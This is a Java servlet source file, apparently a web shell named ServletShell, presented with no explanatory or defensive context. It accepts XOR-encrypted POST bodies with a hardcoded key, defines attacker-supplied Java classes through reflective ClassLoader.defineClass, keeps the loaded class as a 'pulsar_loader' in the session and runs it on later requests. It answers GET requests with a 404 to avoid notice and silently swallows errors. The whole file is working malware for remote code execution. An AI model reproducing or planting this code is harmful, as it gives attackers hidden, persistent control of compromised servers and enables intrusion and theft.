import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

public class ServletShell extends HttpServlet {

    private static final ThreadLocal<HttpServletRequest> currentRequest = new ThreadLocal<>();
    private static final ThreadLocal<HttpServletResponse> currentResponse = new ThreadLocal<>();
    private static final ThreadLocal<HttpSession> currentSession = new ThreadLocal<>();
    private static final ThreadLocal<byte[]> currentPayloadBytes = new ThreadLocal<>();

    private static Object globalLoader = null;
    private static String globalKey = "[KEY]            ";

    public ServletShell() {}

    public Object getRequest() { return currentRequest.get(); }
    public Object getResponse() { return currentResponse.get(); }
    public Object getSession() { return currentSession.get(); }

    public int getContentLength() {
        byte[] data = currentPayloadBytes.get();
        return data != null ? data.length : 0;
    }

    public InputStream getInputStream() {
        byte[] data = currentPayloadBytes.get();
        return new java.io.ByteArrayInputStream(data != null ? data : new byte[0]);
    }

    public Object getAttribute(String name) {
        HttpServletRequest realReq = currentRequest.get();
        return realReq != null ? realReq.getAttribute(name) : null;
    }

    public void setAttribute(String name, Object o) {
        HttpServletRequest realReq = currentRequest.get();
        if (realReq != null) {
            realReq.setAttribute(name, o);
        }
    }

    private byte[] decryptPayload(byte[] data, String keyStr) {
        if (data == null || data.length == 0 || keyStr == null) return new byte[0];
        byte[] decrypted = new byte[data.length];
        byte[] keyBytes = keyStr.getBytes();
        int keyLength = keyBytes.length;
        for (int i = 0; i < data.length; i++) {
            decrypted[i] = (byte) (data[i] ^ keyBytes[(i + 1) % keyLength]);
        }

        return decrypted;
    }

    @Override
    protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        currentRequest.set(request);
        currentResponse.set(response);
        currentSession.set(request.getSession());

        try {
            if (request.getMethod().equalsIgnoreCase("POST")) {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                InputStream isClient = request.getInputStream();
                byte[] buf = new byte[512];
                int length;
                while ((length = isClient.read(buf)) != -1) {
                    bos.write(buf, 0, length);
                }
                byte[] encryptedData = bos.toByteArray();
                currentPayloadBytes.set(encryptedData);

                byte[] xorDecrypted = decryptPayload(encryptedData, globalKey);
                boolean isLoaderInitRequest = (xorDecrypted.length > 4 && xorDecrypted[0] == (byte)0xCA && xorDecrypted[1] == (byte)0xFE && xorDecrypted[2] == (byte)0xBA && xorDecrypted[3] == (byte)0xBE);

                if (isLoaderInitRequest) {
                    if (globalLoader != null) {
                        response.setStatus(200);
                        PrintWriter pwClient = response.getWriter();
                        pwClient.print("LOADER_ALREADY_EXISTS_RESPONSE");
                        pwClient.flush();
                    } else {
                        try {
                            ClassLoader parentLoader = this.getClass().getClassLoader();
                            Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                            defineMethod.setAccessible(true);

                            Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, xorDecrypted, 0, xorDecrypted.length);
                            Constructor<?> constructor = clazz.getConstructor(ClassLoader.class);

                            globalLoader = constructor.newInstance(parentLoader);

                            HttpSession session = request.getSession();
                            session.setAttribute("pulsar_loader", globalLoader);
                            session.setAttribute("k", globalKey);

                            response.setStatus(200);
                            PrintWriter pwClient = response.getWriter();
                            pwClient.print("LOADER_INIT_SUCCESS");
                            pwClient.flush();
                        } catch (Exception e) {
                            response.setStatus(200);
                            PrintWriter pwClient = response.getWriter();
                            pwClient.print("LOADER_FAILED: " + e.toString());
                            pwClient.flush();
                        }
                    }
                    return;
                } else {
                    if (globalLoader != null) {
                        try {
                            try { request.getSession().setAttribute("k", globalKey); } catch (Exception ignored) {}
                            globalLoader.getClass().getMethod("equals", Object.class).invoke(globalLoader, this);
                        } catch (Exception e) {
                            response.setStatus(200);
                            PrintWriter pwClient = response.getWriter();
                            pwClient.print("EXEC_FAILED: " + e.toString());
                            pwClient.flush();
                        }
                    } else {
                        response.setStatus(200);
                        PrintWriter pwClient = response.getWriter();
                        pwClient.print("EXEC_FAILED: No loader initialized in session.");
                        pwClient.flush();
                    }
                    return;
                }
            } else {
                response.sendError(HttpServletResponse.SC_NOT_FOUND);
            }
        } catch (Exception ignored) {
        } finally {
            currentRequest.remove();
            currentResponse.remove();
            currentSession.remove();
            currentPayloadBytes.remove();
        }
    }
}